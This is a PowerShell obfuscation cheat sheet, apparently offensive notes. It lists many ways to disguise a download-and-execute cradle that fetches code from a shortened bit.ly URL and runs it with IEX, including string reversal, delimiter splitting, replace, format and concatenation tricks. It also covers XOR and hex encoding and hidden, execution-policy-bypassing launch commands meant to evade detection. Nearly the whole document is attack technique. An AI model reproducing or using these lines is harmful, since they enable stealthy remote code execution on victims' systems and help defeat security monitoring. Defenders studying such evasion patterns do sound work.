====== 1 Traverse the string in reverse and join it back together        
$reverseCmd = ")'t1g3L/yl.tib//:sptth'(gnirtSdaolnwoD.)tneilCbeW.teNtcejbO-weN("; 1.
IEX ($reverseCmd[-1..-($reverseCmd.Length)] -Join '') | IEX

====== 2. Cast string to char array and use .Net function to reverse and then join it back together
$reverseCmdCharArray = $reverseCmd.ToCharArray(); [Array]::Reverse($reverseCmdCharArray); 
IEX ($reverseCmdCharArray-Join '') | IEX

====== 3. .Net Regex the string RightToLeft and then join it back together
IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX

====== 4. Split the string on the delimiter and join it back together
$cmdWithDelim = "(New-Object N e t .We~~bClient).Downlo~~adString('https://bi~~t.ly/L3g1t')";
IEX ($cmdWithDelim.Split("~~") -Join '') | IEX

====== 5 Replace string:   
$cmdWithDelim= "(New-Object N et .We~~bClient).Downlo~~adString('https://bi~~t.ly/L3g1t')";
== 1.PowerShell's .Replace
IEX $cmdWithDelim.Replace("~~","") | IEX
== 2..Net's -Replace  (and -CReplace which is case-sensitive replace) 
IEX ($cmdWithDelim-Replace "~~","") | IEX
== 3.PowerShell's  -f format operator
IEX ('({0}w-Object {0}t.WebClient).{1}String("{2}bit.ly/L3g1t")' -f  'Ne', 'Download','https://') | IEX



====== 6 Concatenate string:
$c1="(New-Object Net .We"; $c2="bClient).Downlo"; $c3="adString('https://bit.ly/L3g1t')";
== 1.PowerShell's -Join (w/o delimiter)
IEX ($c1,$c2,$c3 -Join '') | IEX
== 2.PowerShell's -Join (with delimiter)
IEX ($c1,$c3 -Join $c2) | IEX
== 3. .Net's Join
IEX ([string]::Join($c2,$c1,$c3)) | IEX
== 4. .Net's Concat
IEX ([string]::Concat($c1,$c2,$c3)) | IEX
== 5. + operator   /   concat without + operator
IEX ($c1+$c2+$c3) | IEX     /     IEX "$c1$c2$c3" | IEX



===== Different ways of encoding:
Binary: [Convert]::ToString(1234, 2)
Octal: [Convert]::ToString(1234, 8)
Hex: [Convert]::ToString(1234, 16)
Change: "{0:X4}" -f 1234
Int: [Byte][Char]([Convert]::ToInt16($_,16))
Ascii: ($cmd.ToCharArray()|%{[int]$_}) -Join $delim
BXOR: $bytes[$i] = $bytes[$i]  -BXOR 0x6A                               

===== Launch tecnicques :
"cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Ec $encode"
"cmd.exe /c "set cmd=Write-Host SUCCESS -Fore Green&& cmd/c echo %cmd%^| powershell-"
powershell -ep bypass -enc <Paste in the Encoded T e x t >
powershell.exe -NoP -NonI -W Hidden -Enc <base64 encoded command>
cmd.exe /c poWerSheLL.exe -eXecutio^nPOlIcy ByPasS^ -n^op^rO^fi^l^e -wIN^dOW^s^tyLe^ hI^d^den^

-NoP (-NoProfile)
-NonI (-NonInteractive)
-NoL (-NoLogo)
-W Hidden (-WindowStyle Hidden)
-EP Bypass (-ExecutionPolicyBypass)
